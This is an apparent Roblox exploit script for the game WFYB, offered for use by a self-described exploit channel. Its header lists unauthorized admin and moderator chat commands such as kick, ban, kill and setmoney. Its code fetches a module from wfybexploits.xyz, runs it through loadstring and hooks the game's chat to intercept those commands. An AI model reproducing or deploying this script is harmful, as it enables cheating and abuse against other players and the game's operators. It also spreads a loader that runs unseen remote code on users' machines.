--[[ 
WFYB Exploits | Youtube.com/@WFYBExploits | Made in Mumbai, India

HOW TO USE?
   1) Type in chat a command with its respective parameters from the list below. 
   2) Send the command in chat.
   3) Enjoy!

VIP SERVER COMMANDS:
   /vipcommands
   /vipfreecam <username>
   /vipstopfreecam <username>
   /vipnextmode
   /kick <username> [reason]
   /vban <username> [reason]
   /unban <username>
   /unbanall
   /bans

MODERATOR COMMANDS:
   /kick <username> [reason]
   /tp <usernameA> <usernameB>
   /ff <username>
   /unff <username>
   /freecam <username>
   /stopfreecam <username>
   /mgivexp <username> <amount> (amount can be negative)
   /mgivemoney <username> <amount> (amount can be negative)
   /invisible <username>
   /visible <username>
   /spectate <viewerusername> [targetusername]
   /gameban <username> <days> [reason]
   /ungameban <username>
   /globalkick <username> [reason]
   /modcommands

ADMIN COMMANDS:
   /nextmode
   /nr
   /givebeta <username>
   /removebeta <username>
   /rgivebeta <username>
   /maxprops <number>
   /rtransferdata <fromusername> <tousername>
   /kick <username> [reason]
   /kill <username>
   /ff <username>
   /unff <username>
   /m <message>
   /rs <username>
   /place <username> <placeName>
   /giveweapon <username> <weapon>
   /giveweapons <username>
   /givemoney <username> <amount>
   /setmoney <username> <amount>
   /rgetmoney <username>
   /rgivemoney <username> <amount>
   /rsetmoney <username> <amount>
   /givelevel <username> <level>
   /rgetlevel <username>
   /rgivelevel <username> <level>
   /damage <username> <amount>
   /damagestamina <username> <amount>
   /maxboats <username> <count>
   /maxhealth <username> <hp>
   /ws <username> <speed>
   /jh <username> <jumpPower>
   /uptime
   /starpower <username>
   /smite <username>
   /commands
]]

local TextChatService = game:GetService("TextChatService")
local Api = "https://wfybexploits.xyz/commandmodule"
local CommandModule
 
local Success, SourceCode = pcall(function()
    local response = request({
        Url = Api,
        Method = "GET"
    })
    
    if response and response.Success and response.Body then
        return response.Body
    else
        return nil
    end
end)

local CompiledFunction, CompileError = loadstring(SourceCode)
local RunSuccess, Result = pcall(CompiledFunction)

CommandModule = Result
if not CommandModule and _G.WFYBCommandModule then
    CommandModule = _G.WFYBCommandModule
end
 
local CommandSet = {
    -- VIP SERVER
    ["/vipcommands"] = true, ["/vipfreecam"] = true, ["/vipstopfreecam"] = true,
    ["/vipnextmode"] = true, ["/kick"] = true, ["/vban"] = true,
    ["/unban"] = true, ["/unbanall"] = true, ["/bans"] = true,
    -- MODERATOR
    ["/tp"] = true, ["/ff"] = true, ["/unff"] = true, ["/freecam"] = true,
    ["/stopfreecam"] = true, ["/mgivexp"] = true, ["/mgivemoney"] = true,
    ["/invisible"] = true, ["/visible"] = true, ["/spectate"] = true,
    ["/gameban"] = true, ["/ungameban"] = true, ["/globalkick"] = true,
    ["/modcommands"] = true,
    -- ADMIN 
    ["/nextmode"] = true, ["/nr"] = true, ["/givebeta"] = true, ["/removebeta"] = true,
    ["/rgivebeta"] = true, ["/maxprops"] = true, ["/rtransferdata"] = true, ["/kill"] = true,
    ["/m"] = true, ["/rs"] = true, ["/place"] = true, ["/giveweapon"] = true,
    ["/giveweapons"] = true, ["/givemoney"] = true, ["/setmoney"] = true,
    ["/rgetmoney"] = true, ["/rgivemoney"] = true, ["/rsetmoney"] = true,
    ["/givelevel"] = true, ["/rgetlevel"] = true, ["/rgivelevel"] = true,
    ["/damage"] = true, ["/damagestamina"] = true, ["/maxboats"] = true,
    ["/maxhealth"] = true, ["/ws"] = true, ["/jh"] = true, ["/uptime"] = true,
    ["/starpower"] = true, ["/smite"] = true, ["/commands"] = true
}

pcall(function()
    do
        TextChatService.SendingMessage:Connect(function(Message)
            local MessageText = Message.Text
            local SpaceIndex = string.find(MessageText, " ")
            local Command
            if SpaceIndex then
               Command = string.sub(MessageText, 1, SpaceIndex - 1)
            else
               Command = MessageText
            end
            if CommandSet[Command] then
               return nil
            end
        end)
    end
end)
